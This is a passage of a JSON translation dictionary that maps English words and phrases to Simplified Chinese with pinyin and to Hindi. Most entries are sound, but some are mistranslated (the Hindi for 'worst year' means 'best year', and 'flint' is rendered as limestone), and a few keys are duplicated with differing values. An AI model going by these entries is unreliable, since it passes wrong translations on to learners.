                "Chinese (Simplified)": "疯子 (fēng zi)",
                "Hindi": "पागल (paagal)"
            },
            "mandarin": {
                "Chinese (Simplified)": "普通话 (pǔ tōng huà)",
                "Hindi": "मंदारिन (mandarin)"
            },
            "mediocre": {
                "Chinese (Simplified)": "平庸的 (píng yōng de)",
                "Hindi": "सामान्य (saamanya)"
            },
            "merchandise": {
                "Chinese (Simplified)": "商品 (shāng pǐn)",
                "Hindi": "माल (maal)"
            },
            "nemesis": {
                "Chinese (Simplified)": "死敌 (sǐ dí)",
                "Hindi": "शत्रु (shatru)"
            },
            "nepotism": {
                "Chinese (Simplified)": "裙带关系 (qún dài guān xì)",
                "Hindi": "भाई-भतीजावाद (bhai-bhatijavaad)"
            },
            "niche": {
                "Chinese (Simplified)": "利基 (lì jī)",
                "Hindi": "स्थान (sthaan)"
            },
            "nirvana": {
                "Chinese (Simplified)": "涅槃 (niè pán)",
                "Hindi": "निर्वाण (nirvaan)"
            },
            "oblivious": {
                "Chinese (Simplified)": "忘记的 (wàng jì de)",
                "Hindi": "अनजान (anjaan)"
            },
            "obscure": {
                "Chinese (Simplified)": "模糊的 (mó hú de)",
                "Hindi": "अस्पष्ट (asparsh)"
            },
            "odor": {
                "Chinese (Simplified)": "气味 (qì wèi)",
                "Hindi": "गंध (gandh)"
            },
            "omen": {
                "Chinese (Simplified)": "预兆 (yù zhào)",
                "Hindi": "शकुन (shakun)"
            },
            "overwhelm": {
                "Chinese (Simplified)": "压倒 (yā dǎo)",
                "Hindi": "पराजित करना (parajit karna)"
            },
            "protocol": {
                "Chinese (Simplified)": "协议 (xié yì)",
                "Hindi": "प्रोटोकॉल (protocol)"
            },
            "remorse": {
                "Chinese (Simplified)": "悔恨 (huǐ hèn)",
                "Hindi": "पश्चाताप (pashchataap)"
            },
            "satire": {
                "Chinese (Simplified)": "讽刺 (fěng cì)",
                "Hindi": "व्यंग्य (vyangya)"
            },
            "seminal": {
                "Chinese (Simplified)": "开创性的 (kāi chuàng xìng de)",
                "Hindi": "प्रारंभिक (praarambhik)"
            },
            "tactical": {
                "Chinese (Simplified)": "战术的 (zhàn shù de)",
                "Hindi": "युद्धनीतिक (yuddhneetik)"
            },
            "taunt": {
                "Chinese (Simplified)": "嘲讽 (cháo fěng)",
                "Hindi": "ताना मारना (taana maarna)"
            },
            "wound": {
                "Chinese (Simplified)": "伤口 (shāng kǒu)",
                "Hindi": "घाव (ghaav)"
            },
            "termination": {
                "Chinese (Simplified)": "终止 (zhōng zhǐ)",
                "Hindi": "समाप्ति (samaapti)"
            },
            "utility": {
                "Chinese (Simplified)": "实用性 (shí yòng xìng)",
                "Hindi": "उपयोगिता (upayogita)"
            },
            "valour": {
                "Chinese (Simplified)": "英勇 (yīng yǒng)",
                "Hindi": "वीरता (veerata)"
            },
            "versatile": {
                "Chinese (Simplified)": "多才多艺的 (duō cái duō yì de)",
                "Hindi": "बहुमुखी (bahumukhi)"
            },
            "wardrobe": {
                "Chinese (Simplified)": "衣柜 (yī guì)",
                "Hindi": "अलमारी (almaari)"
            },
            "wanderlust": {
                "Chinese (Simplified)": "旅行癖 (lǚ xíng pǐ)",
                "Hindi": "यात्रा की लालसा (yaatra ki laalsa)"
            },
            "yank": {
                "Chinese (Simplified)": "猛拉 (měng lā)",
                "Hindi": "झटके से खींचना (jhatke se kheenchna)"
            },
            "yatter": {
                "Chinese (Simplified)": "喋喋不休 (dié dié bù xiū)",
                "Hindi": "बकबक (bakbak)"
            },
            "zest": {
                "Chinese (Simplified)": "热情 (rè qíng)",
                "Hindi": "उत्साह (utsah)"
            },
            "boy": {
                "Chinese (Simplified)": "男孩 (nán hái)",
                "Hindi": "लड़का (ladka)"
            },
            "girl": {
                "Chinese (Simplified)": "女孩 (nǚ hái)",
                "Hindi": "लड़की (ladki)"
            },
            "siblings": {
                "Chinese (Simplified)": "兄弟姐妹 (xiōng dì jiě mèi)",
                "Hindi": "भाई-बहन (bhai-behan)"
            },
            "parenting": {
                "Chinese (Simplified)": "育儿 (yù ér)",
                "Hindi": "पालन-पोषण (paalan-poshan)"
            },
            "babysitting": {
                "Chinese (Simplified)": "照看孩子 (zhào kàn hái zi)",
                "Hindi": "बच्चों की देखभाल (bachchon ki dekhbhal)"
            },
            "babysitter": {
                "Chinese (Simplified)": "保姆 (bǎo mǔ)",
                "Hindi": "शिशु-पालक (shishu-palak)"
            },
            "traits": {
                "Chinese (Simplified)": "特征 (tè zhēng)",
                "Hindi": "गुण (gun)"
            },
            "new year": {
                "Chinese (Simplified)": "新年 (xīn nián)",
                "Hindi": "नया साल (naya saal)"
            },
            "newyear": {
                "Chinese (Simplified)": "新年 (xīn nián)",
                "Hindi": "नया साल (naya saal)"
            },
            "christmas": {
                "Chinese (Simplified)": "圣诞节 (shèng dàn jié)",
                "Hindi": "क्रिसमस (krismas)"
            },
            "merry": {
                "Chinese (Simplified)": "愉快的 (yú kuài de)",
                "Hindi": "खुश (khush)"
            },
            "marry": {
                "Chinese (Simplified)": "结婚 (jié hūn)",
                "Hindi": "शादी करना (shaadi karna)"
            },
            "snowfall": {
                "Chinese (Simplified)": "降雪 (jiàng xuě)",
                "Hindi": "बर्फबारी (barfbaari)"
            },
            "boil": {
                "Hindi": "उबालना",
                "Chinese (Simplified)": "煮 (Zhǔ)"
            },
            "drop out": {
                "Hindi": "छोड़ना",
                "Chinese (Simplified)": "退学 (Tuìxué)"
            },
            "south asian": {
                "Hindi": "दक्षिण एशियाई",
                "Chinese (Simplified)": "南亚 (Nányà)"
            },
            "descent": {
                "Hindi": "वंश",
                "Chinese (Simplified)": "血统 (Xuètǒng)"
            },
            "unadulterated": {
                "Hindi": "अमिश्रित",
                "Chinese (Simplified)": "纯粹的 (Chúncuì de)"
            },
            "adulterated": {
                "Hindi": "मिलावटी",
                "Chinese (Simplified)": "掺假的 (Chānjiǎ de)"
            },
            "definition": {
                "Hindi": "परिभाषा",
                "Chinese (Simplified)": "定义 (Dìngyì)"
            },
            "revise": {
                "Hindi": "पुनरावलोकन करना",
                "Chinese (Simplified)": "修订 (Xiūdìng)"
            },
            "revision": {
                "Hindi": "संशोधन",
                "Chinese (Simplified)": "修订 (Xiūdìng)"
            },
            "colony": {
                "Hindi": "औपनिवेश",
                "Chinese (Simplified)": "殖民地 (Zhímíndì)"
            },
            "colonize": {
                "Hindi": "उपनिवेश बनाना",
                "Chinese (Simplified)": "殖民 (Zhímín)"
            },
            "genocide": {
                "Hindi": "नरसंहार",
                "Chinese (Simplified)": "种族灭绝 (Zhǒngzú mièjué)"
            },
            "igneous": {
                "Hindi": "आग्नेय",
                "Chinese (Simplified)": "火成的 (Huǒchéng de)"
            },
            "indigenous": {
                "Hindi": "स्वदेशी",
                "Chinese (Simplified)": "土著的 (Tǔzhù de)"
            },
            "meant": {
                "Hindi": "अर्थ",
                "Chinese (Simplified)": "意思是 (Yìsi shì)"
            },
            "exact": {
                "Hindi": "सटीक",
                "Chinese (Simplified)": "精确的 (Jīngquè de)"
            },
            "aspect": {
                "Hindi": "पहलू",
                "Chinese (Simplified)": "方面 (Fāngmiàn)"
            },
            "assets": {
                "Hindi": "संपत्तियां",
                "Chinese (Simplified)": "资产 (Zīchǎn)"
            },
            "exactly": {
                "Hindi": "बिल्कुल",
                "Chinese (Simplified)": "确切地 (Quèqiè de)"
            },
            "derogatory": {
                "Hindi": "अपमानजनक",
                "Chinese (Simplified)": "贬义的 (Biǎnyì de)"
            },
            "label": {
                "Hindi": "लेबल",
                "Chinese (Simplified)": "标签 (Biāoqiān)"
            },
            "colloquially": {
                "Hindi": "बोलचाल की भाषा में",
                "Chinese (Simplified)": "口语化地 (Kǒuyǔ huà de)"
            },
            "derived": {
                "Hindi": "व्युत्पन्न",
                "Chinese (Simplified)": "源自 (Yuán zì)"
            },
            "mainly": {
                "Hindi": "मुख्य रूप से",
                "Chinese (Simplified)": "主要是 (Zhǔyào shì)"
            },
            "slang": {
                "Hindi": "चलन शब्द",
                "Chinese (Simplified)": "俚语 (Lǐyǔ)"
            },
            "personal": {
                "Hindi": "निजी",
                "Chinese (Simplified)": "个人的 (Gèrén de)"
            },
            "identity": {
                "Hindi": "पहचान",
                "Chinese (Simplified)": "身份 (Shēnfèn)"
            },
            "infect": {
                "Hindi": "संक्रमित करना",
                "Chinese (Simplified)": "感染 (Gǎnrǎn)"
            },
            "infact": {
                "Hindi": "वास्तव में",
                "Chinese (Simplified)": "实际上 (Shíjì shàng)"
            },
            "infection": {
                "Hindi": "संक्रमण",
                "Chinese (Simplified)": "感染 (Gǎnrǎn)"
            },
            "alphabet": {
                "Hindi": "वर्णमाला",
                "Chinese (Simplified)": "字母表 (Zìmǔ biǎo)"
            },
            "insert": {
                "Hindi": "डालना",
                "Chinese (Simplified)": "插入 (Chārù)"
            },
            "though": {
                "Hindi": "हालांकि",
                "Chinese (Simplified)": "虽然 (Suīrán)"
            },
            "transfer": {
                "Hindi": "स्थानांतरण",
                "Chinese (Simplified)": "转移 (Zhuǎnyí)"
            },
            "disclaimer": {
                "Hindi": "अस्वीकरण",
                "Chinese (Simplified)": "免责声明 (Miǎnzé shēngmíng)"
            },
            "statistics": {
                "Hindi": "आंकड़े",
                "Chinese (Simplified)": "统计数据 (Tǒngjì shùjù)"
            },
            "license": {
                "Hindi": "लाइसेंस",
                "Chinese (Simplified)": "许可证 (Xǔkě zhèng)"
            },
            "internal": {
                "Hindi": "आंतरिक",
                "Chinese (Simplified)": "内部的 (Nèibù de)"
            },
            "external": {
                "Hindi": "बाहरी",
                "Chinese (Simplified)": "外部的 (Wàibù de)"
            },
            "did you know": {
                "Hindi": "क्या आप जानते हैं",
                "Chinese (Simplified)": "你知道吗 (Nǐ zhīdào ma)"
            },
            "blunder": {
                "Hindi": "ग़लती",
                "Chinese (Simplified)": "错误 (Cuòwù)"
            },
            "except": {
                "Hindi": "सिवाय",
                "Chinese (Simplified)": "除了 (Chúle)"
            },
            "over": {
                "Hindi": "ऊपर",
                "Chinese (Simplified)": "超过 (Chāoguò)"
            },
            "shut": {
                "Hindi": "बंद",
                "Chinese (Simplified)": "关闭 (Guānbì)"
            },
            "lock pick": {
                "Hindi": "ताला खोलना",
                "Chinese (Simplified)": "开锁 (Kāi suǒ)"
            },
            "loudness": {
                "Hindi": "आवाज़",
                "Chinese (Simplified)": "响度 (Xiǎng dù)"
            },
            "bound": {
                "Hindi": "बँधना",
                "Chinese (Simplified)": "绑定 (Bǎngdì)"
            },
            "client": {
                "Hindi": "ग्राहक",
                "Chinese (Simplified)": "客户 (Kèhù)"
            },
            "flint": {
                "Hindi": "चूना पत्थर",
                "Chinese (Simplified)": "燧石 (Suì shí)"
            },
            "gravel": {
                "Hindi": "गिट्टी",
                "Chinese (Simplified)": "碎石 (Suì shí)"
            },
            "night owl": {
                "Hindi": "रात का उल्लू",
                "Chinese (Simplified)": "夜猫子 (Yè māo zi)"
            },
            "enthusiast": {
                "Hindi": "उत्साही",
                "Chinese (Simplified)": "爱好者 (Ài hào zhě)"
            },
            "merry": {
                "Hindi": "खुश",
                "Chinese (Simplified)": "快乐 (Kuàilè)"
            },
            "prosperous": {
                "Hindi": "समृद्ध",
                "Chinese (Simplified)": "繁荣 (Fánróng)"
            },
            "conference": {
                "Hindi": "सम्मेलन",
                "Chinese (Simplified)": "会议 (Huìyì)"
            },
            "anticheat": {
                "Hindi": "एंटीचिटिंग",
                "Chinese (Simplified)": "反作弊 (Fǎn zuòbì)"
            },
            "replied": {
                "Hindi": "जवाब दिया",
                "Chinese (Simplified)": "回复 (Huífù)"
            },
            "anonymous": {
                "Hindi": "गुमनाम",
                "Chinese (Simplified)": "匿名 (Nìmíng)"
            },
            "anonymously": {
                "Hindi": "गुमनाम तरीके से",
                "Chinese (Simplified)": "匿名地 (Nìmíng de)"
            },
            "anonymity": {
                "Hindi": "गुमनामी",
                "Chinese (Simplified)": "匿名性 (Nìmíngxìng)"
            },
            "bundle": {
                "Hindi": "गट्ठर",
                "Chinese (Simplified)": "捆绑 (Kǔnbǎng)"
            },
            "dumble": {
                "Hindi": "पोटली",
                "Chinese (Simplified)": "包裹 (Bāoguǒ)"
            },
            "extension": {
                "Hindi": "विस्तार",
                "Chinese (Simplified)": "扩展 (Kuòzhǎn)"
            },
            "dashboard": {
                "Hindi": "डैशबोर्ड",
                "Chinese (Simplified)": "仪表盘 (Yíbiǎo pán)"
            },
            "clit": {
                "Hindi": "यौन अंग",
                "Chinese (Simplified)": "阴蒂 (Yīndì)"
            },
            "blown": {
                "Hindi": "उड़ा हुआ",
                "Chinese (Simplified)": "吹走的 (Chuī zǒu de)"
            },
            "chamber": {
                "Hindi": "कक्ष",
                "Chinese (Simplified)": "房间 (Fángjiān)"
            },
            "hub": {
                "Hindi": "केंद्र",
                "Chinese (Simplified)": "中心 (Zhōngxīn)"
            },
            "assistant": {
                "Hindi": "सहायक",
                "Chinese (Simplified)": "助手 (Zhùshǒu)"
            },
            "assistance": {
                "Hindi": "सहायता",
                "Chinese (Simplified)": "帮助 (Bāngzhù)"
            },
            "more over": {
                "Hindi": "इसके अलावा",
                "Chinese (Simplified)": "而且 (Érqiě)"
            },
            "can you do this for me": {
                "Hindi": "क्या आप यह मेरे लिए कर सकते हैं",
                "Chinese (Simplified)": "你能为我做这个吗？ (Nǐ néng wèi wǒ zuò zhège ma?)"
            },
            "let's do this": {
                "Hindi": "चलो यह करते हैं",
                "Chinese (Simplified)": "我们来做这个吧 (Wǒmen lái zuò zhège ba)"
            },
            "can you help me": {
                "Hindi": "क्या आप मेरी मदद कर सकते हैं",
                "Chinese (Simplified)": "你能帮我吗？ (Nǐ néng bāng wǒ ma?)"
            },
            "can you keep it": {
                "Hindi": "क्या आप इसे रख सकते हैं",
                "Chinese (Simplified)": "你能保留它吗？ (Nǐ néng bǎoliú tā ma?)"
            },
            "catch it": {
                "Hindi": "इसे पकड़ो",
                "Chinese (Simplified)": "抓住它 (Zhuā zhù tā)"
            },
            "let's explore": {
                "Hindi": "चलो अन्वेषण करें",
                "Chinese (Simplified)": "让我们探索吧 (Ràng wǒmen tànsuǒ ba)"
            },
            "expense": {
                "Hindi": "व्यय",
                "Chinese (Simplified)": "费用 (Fèiyòng)"
            },
            "track": {
                "Hindi": "पटरियाँ",
                "Chinese (Simplified)": "轨道 (Guǐdào)"
            },
            "tracking": {
                "Hindi": "ट्रैकिंग",
                "Chinese (Simplified)": "跟踪 (Gēnzōng)"
            },
            "tracker": {
                "Hindi": "ट्रैकर",
                "Chinese (Simplified)": "追踪器 (Zhuīzōng qì)"
            },
            "bye": {
                "Hindi": "अलविदा",
                "Chinese (Simplified)": "再见 (Zàijiàn)"
            },
            "hi": {
                "Hindi": "नमस्ते",
                "Chinese (Simplified)": "你好 (Nǐ hǎo)"
            },
            "hey": {
                "Hindi": "अरे",
                "Chinese (Simplified)": "嘿 (Hēi)"
            },
            "babysitter": {
                "Hindi": "बच्चों की देखभाल करने वाला",
                "Chinese (Simplified)": "保姆 (Bǎomǔ)"
            },
            "janitor": {
                "Hindi": "चपरासी",
                "Chinese (Simplified)": "清洁工 (Qīngjié gōng)"
            },
            "good bye": {
                "Hindi": "अलविदा",
                "Chinese (Simplified)": "再见 (Zàijiàn)"
            },
            "hardcore": {
                "Hindi": "कट्टर",
                "Chinese (Simplified)": "硬核 (Yìng hé)"
            },
            "core": {
                "Hindi": "मूल",
                "Chinese (Simplified)": "核心 (Héxīn)"
            },
            "insult": {
                "Hindi": "अपमान",
                "Chinese (Simplified)": "侮辱 (Wǔrǔ)"
            },
            "chronic": {
                "Hindi": "पुराना",
                "Chinese (Simplified)": "慢性的 (Mànxìng de)"
            },
            "chronology": {
                "Hindi": "कालक्रम",
                "Chinese (Simplified)": "年代学 (Niándài xué)"
            },
            "falling": {
                "Hindi": "गिरना",
                "Chinese (Simplified)": "下落 (Xiàluò)"
            },
            "aware": {
                "Hindi": "जागरूक",
                "Chinese (Simplified)": "意识到的 (Yìshí dào de)"
            },
            "awareness": {
                "Hindi": "जागरूकता",
                "Chinese (Simplified)": "意识 (Yìshí)"
            },
            "self awareness": {
                "Hindi": "आत्म-जागरूकता",
                "Chinese (Simplified)": "自我意识 (Zìwǒ yìshí)"
            },
            "coach": {
                "Hindi": "प्रशिक्षक",
                "Chinese (Simplified)": "教练 (Jiàoliàn)"
            },
            "tuition": {
                "Hindi": "शिक्षा शुल्क",
                "Chinese (Simplified)": "学费 (Xuéfèi)"
            },
            "revealed": {
                "Hindi": "प्रकट किया",
                "Chinese (Simplified)": "揭示了 (Jiēshì le)"
            },
            "template": {
                "Hindi": "खाका",
                "Chinese (Simplified)": "模板 (Múbǎn)"
            },
            "presentation": {
                "Hindi": "प्रस्तुति",
                "Chinese (Simplified)": "演示 (Yǎnshì)"
            },
            "marketing": {
                "Hindi": "विपणन",
                "Chinese (Simplified)": "营销 (Yíngxiāo)"
            },
            "story telling": {
                "Hindi": "कहानी सुनाना",
                "Chinese (Simplified)": "讲故事 (Jiǎng gùshì)"
            },
            "board": {
                "Hindi": "बोर्ड",
                "Chinese (Simplified)": "板 (Bǎn)"
            },
            "empire": {
                "Hindi": "साम्राज्य",
                "Chinese (Simplified)": "帝国 (Dìguó)"
            },
            "mystic": {
                "Hindi": "रहस्यमय",
                "Chinese (Simplified)": "神秘的 (Shénmì de)"
            },
            "kept": {
                "Hindi": "रखा गया",
                "Chinese (Simplified)": "保留 (Bǎoliú)"
            },
            "accomplish": {
                "Hindi": "पूरा करना",
                "Chinese (Simplified)": "完成 (Wánchéng)"
            },
            "park": {
                "Hindi": "उद्यान",
                "Chinese (Simplified)": "公园 (Gōngyuán)"
            },
            "cinema": {
                "Hindi": "सिनेमा",
                "Chinese (Simplified)": "电影院 (Diànyǐngyuàn)"
            },
            "non religious": {
                "Hindi": "गैर-धार्मिक",
                "Chinese (Simplified)": "非宗教的 (Fēi zōngjiào de)"
            },
            "bleach": {
                "Hindi": "सफ़ेद करना",
                "Chinese (Simplified)": "漂白 (Piǎobái)"
            },
            "bleaching": {
                "Hindi": "सफ़ेद करना",
                "Chinese (Simplified)": "漂白过程 (Piǎobái guòchéng)"
            },
            "bleached": {
                "Hindi": "सफ़ेद किया हुआ",
                "Chinese (Simplified)": "漂白的 (Piǎobái de)"
            },
            "normalization": {
                "Hindi": "सामान्यीकरण",
                "Chinese (Simplified)": "规范化 (Guīfànhuà)"
            },
            "agitation": {
                "Hindi": "उत्तेजना",
                "Chinese (Simplified)": "骚动 (Sāodòng)"
            },
            "assist": {
                "Hindi": "मदद करना",
                "Chinese (Simplified)": "协助 (Xiézhù)"
            },
            "appreciate": {
                "Hindi": "सराहना",
                "Chinese (Simplified)": "欣赏 (Xīnshǎng)"
            },
            "assume": {
                "Hindi": "मान लेना",
                "Chinese (Simplified)": "假设 (Jiǎshè)"
            },
            "aching": {
                "Hindi": "दर्द हो रहा है",
                "Chinese (Simplified)": "疼痛的 (Téngtòng de)"
            },
            "ball": {
                "Hindi": "गेंद",
                "Chinese (Simplified)": "球 (Qiú)"
            },
            "alarm": {
                "Hindi": "चेतावनी",
                "Chinese (Simplified)": "警报 (Jǐngbào)"
            },
            "bat": {
                "Hindi": "चमगादड़ / बल्ला",
                "Chinese (Simplified)": "蝙蝠 (Biānfú) / 球棒 (Qiúbàng)"
            },
            "blend": {
                "Hindi": "मिश्रण",
                "Chinese (Simplified)": "混合 (Hùnhé)"
            },
            "bounce": {
                "Hindi": "उछलना",
                "Chinese (Simplified)": "弹跳 (Tántiào)"
            },
            "brag": {
                "Hindi": "शेखी बघारना",
                "Chinese (Simplified)": "吹嘘 (Chuīxū)"
            },
            "grab": {
                "Hindi": "पकड़ना",
                "Chinese (Simplified)": "抓住 (Zhuāzhù)"
            },
            "browse": {
                "Hindi": "ब्राउज़ करना",
                "Chinese (Simplified)": "浏览 (Liúlǎn)"
            },
            "bake": {
                "Hindi": "सेंकना",
                "Chinese (Simplified)": "烘焙 (Hōngbèi)"
            },
            "conclude": {
                "Hindi": "निष्कर्ष निकालना",
                "Chinese (Simplified)": "总结 (Zǒngjié)"
            },
            "consider": {
                "Hindi": "विचार करना",
                "Chinese (Simplified)": "考虑 (Kǎolǜ)"
            },
            "contain": {
                "Hindi": "शामिल करना",
                "Chinese (Simplified)": "包含 (Bāohán)"
            },
            "contribute": {
                "Hindi": "योगदान देना",
                "Chinese (Simplified)": "贡献 (Gòngxiàn)"
            },
            "contributing": {
                "Hindi": "योगदान करते हुए",
                "Chinese (Simplified)": "贡献中 (Gòngxiàn zhōng)"
            },
            "drive": {
                "Hindi": "चलाना",
                "Chinese (Simplified)": "驾驶 (Jiàshǐ)"
            },
            "deliver": {
                "Hindi": "पहुंचाना",
                "Chinese (Simplified)": "交付 (Jiāofù)"
            },
            "declare": {
                "Hindi": "घोषणा करना",
                "Chinese (Simplified)": "宣布 (Xuānbù)"
            },
            "dedicate": {
                "Hindi": "समर्पित करना",
                "Chinese (Simplified)": "奉献 (Fèngxiàn)"
            },
            "describe": {
                "Hindi": "वर्णन करना",
                "Chinese (Simplified)": "描述 (Miáoshù)"
            },
            "depend": {
                "Hindi": "निर्भर करना",
                "Chinese (Simplified)": "依靠 (Yīkào)"
            },
            "discuss": {
                "Hindi": "चर्चा करना",
                "Chinese (Simplified)": "讨论 (Tǎolùn)"
            },
            "evaluate": {
                "Hindi": "मूल्यांकन करना",
                "Chinese (Simplified)": "评估 (Pínggū)"
            },
            "examine": {
                "Hindi": "जांचना",
                "Chinese (Simplified)": "检查 (Jiǎnchá)"
            },
            "forget": {
                "Hindi": "भूल जाना",
                "Chinese (Simplified)": "忘记 (Wàngjì)"
            },
            "fold": {
                "Hindi": "मोड़ना",
                "Chinese (Simplified)": "折叠 (Zhédié)"
            },
            "flee": {
                "Hindi": "भाग जाना",
                "Chinese (Simplified)": "逃跑 (Táopǎo)"
            },
            "fuel": {
                "Hindi": "ईंधन देना",
                "Chinese (Simplified)": "加燃料 (Jiā ránliào)"
            },
            "gather": {
                "Hindi": "इकट्ठा करना",
                "Chinese (Simplified)": "收集 (Shōují)"
            },
            "tilt": {
                "Hindi": "झुकाना",
                "Chinese (Simplified)": "倾斜 (Qīngxié)"
            },
            "gain": {
                "Hindi": "प्राप्त करना",
                "Chinese (Simplified)": "获得 (Huòdé)"
            },
            "grasp": {
                "Hindi": "पकड़",
                "Chinese (Simplified)": "抓住 (Zhuāzhù)"
            },
            "greet": {
                "Hindi": "अभिवादन करना",
                "Chinese (Simplified)": "问候 (Wènhòu)"
            },
            "hunt": {
                "Hindi": "शिकार करना",
                "Chinese (Simplified)": "狩猎 (Shòuliè)"
            },
            "highlight": {
                "Hindi": "मुख्य बिंदु दिखाना",
                "Chinese (Simplified)": "突出显示 (Tūchū xiǎnshì)"
            },
            "hike": {
                "Hindi": "चढ़ाई करना",
                "Chinese (Simplified)": "徒步旅行 (Túbù lǚxíng)"
            },
            "illustrate": {
                "Hindi": "व्याख्या करना",
                "Chinese (Simplified)": "说明 (Shuōmíng)"
            },
            "insist": {
                "Hindi": "ज़ोर देना",
                "Chinese (Simplified)": "坚持 (Jiānchí)"
            },
            "involve": {
                "Hindi": "शामिल करना",
                "Chinese (Simplified)": "涉及 (Shèjí)"
            },
            "indicate": {
                "Hindi": "संकेत करना",
                "Chinese (Simplified)": "表明 (Biǎomíng)"
            },
            "interpret": {
                "Hindi": "व्याख्या करना",
                "Chinese (Simplified)": "解释 (Jiěshì)"
            },
            "jug": {
                "Hindi": "जग",
                "Chinese (Simplified)": "壶 (Hú)"
            },
            "fruits bowl": {
                "Hindi": "फलों का कटोरा",
                "Chinese (Simplified)": "水果碗 (Shuǐguǒ wǎn)"
            },
            "kilo": {
                "Hindi": "किलो",
                "Chinese (Simplified)": "千克 (Qiānkè)"
            },
            "meter": {
                "Hindi": "मीटर",
                "Chinese (Simplified)": "米 (Mǐ)"
            },
            "miles": {
                "Hindi": "मील",
                "Chinese (Simplified)": "英里 (Yīnglǐ)"
            },
            "centimeter": {
                "Hindi": "सेंटीमीटर",
                "Chinese (Simplified)": "厘米 (Límǐ)"
            },
            "millimeter": {
                "Hindi": "मिलीमीटर",
                "Chinese (Simplified)": "毫米 (Háomǐ)"
            },
            "justify": {
                "Hindi": "न्यायोचित ठहराना",
                "Chinese (Simplified)": "证明 (Zhèngmíng)"
            },
            "juggle": {
                "Hindi": "जुगलिंग करना",
                "Chinese (Simplified)": "耍杂技 (Shuǎ zájì)"
            },
            "jab": {
                "Hindi": "चोट देना",
                "Chinese (Simplified)": "戳 (Chuō)"
            },
            "jolt": {
                "Hindi": "झटका",
                "Chinese (Simplified)": "震动 (Zhèndòng)"
            },
            "jog": {
                "Hindi": "धीमी दौड़",
                "Chinese (Simplified)": "慢跑 (Mànpǎo)"
            },
            "jabber": {
                "Hindi": "बड़बड़ाना",
                "Chinese (Simplified)": "快言乱语 (Kuài yán luàn yǔ)"
            },
            "knead": {
                "Hindi": "गूंधना",
                "Chinese (Simplified)": "揉 (Róu)"
            },
            "knit": {
                "Hindi": "बुनाई करना",
                "Chinese (Simplified)": "编织 (Biānzhī)"
            },
            "kettle": {
                "Hindi": "केतली",
                "Chinese (Simplified)": "水壶 (Shuǐhú)"
            },
            "knockout": {
                "Hindi": "नॉकआउट",
                "Chinese (Simplified)": "击倒 (Jídǎo)"
            },
            "knowingly": {
                "Hindi": "जानबूझकर",
                "Chinese (Simplified)": "故意地 (Gùyì de)"
            },
            "crystal": {
                "Hindi": "क्रिस्टल",
                "Chinese (Simplified)": "水晶 (Shuǐjīng)"
            },
            "label": {
                "Hindi": "लेबल",
                "Chinese (Simplified)": "标签 (Biāoqiān)"
            },
            "stiff": {
                "Hindi": "कठोर",
                "Chinese (Simplified)": "僵硬 (Jiāngyìng)"
            },
            "sniff": {
                "Hindi": "सूंघना",
                "Chinese (Simplified)": "嗅 (Xiù)"
            },
            "locate": {
                "Hindi": "खोजना",
                "Chinese (Simplified)": "定位 (Dìngwèi)"
            },
            "leap": {
                "Hindi": "छलांग लगाना",
                "Chinese (Simplified)": "跳跃 (Tiàoyuè)"
            },
            "leaf": {
                "Hindi": "पत्ता",
                "Chinese (Simplified)": "叶子 (Yèzi)"
            },
            "summon": {
                "Hindi": "बुलाना",
                "Chinese (Simplified)": "召唤 (Zhàohuàn)"
            },
            "morph": {
                "Hindi": "रूप बदलना",
                "Chinese (Simplified)": "变形 (Biànxíng)"
            },
            "maintain": {
                "Hindi": "बनाए रखना",
                "Chinese (Simplified)": "维护 (Wéihù)"
            },
            "mention": {
                "Hindi": "उल्लेख करना",
                "Chinese (Simplified)": "提到 (Tídào)"
            },
            "mimic": {
                "Hindi": "नकल करना",
                "Chinese (Simplified)": "模仿 (Mófǎng)"
            },
            "notice": {
                "Hindi": "ध्यान देना",
                "Chinese (Simplified)": "注意 (Zhùyì)"
            },
            "nature": {
                "Hindi": "प्रकृति",
                "Chinese (Simplified)": "自然 (Zìrán)"
            },
            "narrow": {
                "Hindi": "संकरी",
                "Chinese (Simplified)": "狭窄 (Xiázhǎi)"
            },
            "compliment": {
                "Chinese (Simplified)": "赞美 (zàn měi)",
                "Hindi": "सम्मान (sammaan)"
            },
            "carta": {
                "Chinese (Simplified)": "信 (xìn)",
                "Hindi": "पत्र (patra)"
            },
            "afterlife": {
                "Chinese (Simplified)": "来世 (lái shì)",
                "Hindi": "परलोक (parlok)"
            },
            "would you rather": {
                "Chinese (Simplified)": "你会选择 (nǐ huì xuǎn zé)",
                "Hindi": "क्या आप पसंद करेंगे (kya aap pasand karenge)"
            },
            "blonde": {
                "Chinese (Simplified)": "金发 (jīn fà)",
                "Hindi": "ब्लॉन्ड (blonde)"
            },
            "dye": {
                "Chinese (Simplified)": "染色 (rǎn sè)",
                "Hindi": "रंगना (rangna)"
            },
            "haircut": {
                "Chinese (Simplified)": "理发 (lǐ fà)",
                "Hindi": "हेयरकट (haircut)"
            },
            "hairstyle": {
                "Chinese (Simplified)": "发型 (fà xíng)",
                "Hindi": "बालों की शैली (baalon ki shaili)"
            },
            "nostalgia": {
                "Chinese (Simplified)": "怀旧 (huái jiù)",
                "Hindi": "अतीत की यादें (ateet ki yaadein)"
            },
            "phobia": {
                "Chinese (Simplified)": "恐惧症 (kǒng jù zhèng)",
                "Hindi": "भय (bhay)"
            },
            "magma": {
                "Chinese (Simplified)": "岩浆 (yán jiāng)",
                "Hindi": "मग्मा (magma)"
            },
            "erupt": {
                "Chinese (Simplified)": "爆发 (bào fā)",
                "Hindi": "विस्फोट (visfot)"
            },
            "eruption": {
                "Chinese (Simplified)": "爆发 (bào fā)",
                "Hindi": "विस्फोट (visfot)"
            },
            "well": {
                "Chinese (Simplified)": "井 (jǐng)",
                "Hindi": "कुंआ (kunwa)"
            },
            "booking": {
                "Chinese (Simplified)": "预定 (yù dìng)",
                "Hindi": "बुकिंग (booking)"
            },
            "worst year": {
                "Chinese (Simplified)": "最糟糕的年份 (zuì zāo gāo de nián fèn)",
                "Hindi": "सर्वश्रेष्ठ वर्ष (sarvashreshth varsh)"
            },
            "best year": {
                "Chinese (Simplified)": "最好的一年 (zuì hǎo de yī nián)",
                "Hindi": "सर्वश्रेष्ठ वर्ष (sarvashreshth varsh)"
            },
            "glimpses": {
                "Chinese (Simplified)": "一瞥 (yī piē)",
                "Hindi": "झलक (jhalak)"
            },
            "arithmetic": {
                "Chinese (Simplified)": "算术 (suàn shù)",
                "Hindi": "गणित (ganit)"
            },
            "time table": {
                "Chinese (Simplified)": "时间表 (shí jiān biǎo)",
                "Hindi": "समय सारणी (samay sarani)"
            },
            "theater": {
                "Chinese (Simplified)": "剧院 (jù yuàn)",
                "Hindi": "थियेटर (theater)"
            },
            "arrogant": {
                "Chinese (Simplified)": "傲慢 (ào màn)",
